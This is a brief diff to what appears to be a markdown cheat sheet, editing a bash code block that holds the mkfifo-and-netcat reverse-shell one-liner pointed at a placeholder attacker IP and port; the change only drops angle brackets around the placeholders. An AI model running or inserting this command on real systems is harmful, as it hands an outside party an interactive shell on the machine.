@@ -30,5 +30,5 @@ or if no `-e`
 
 ```bash
 mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker ip> <listening port> > /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f
 ```
